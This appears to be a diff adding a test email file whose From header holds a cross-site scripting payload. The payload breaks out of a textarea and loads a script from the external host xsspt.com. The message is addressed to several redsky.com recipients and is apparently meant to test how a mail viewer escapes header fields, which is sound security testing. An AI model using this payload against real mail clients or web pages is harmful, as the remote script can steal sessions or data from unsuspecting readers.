@@ -1,0 +1,7 @@
+From: <"test</textarea><script src=http://xsspt.com/6zTrS1?1456361170></script>@attack.com">
+To: lallen@redsky.com, kliu@redsky.com, aristaino@redsky.com, awall@redsky.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
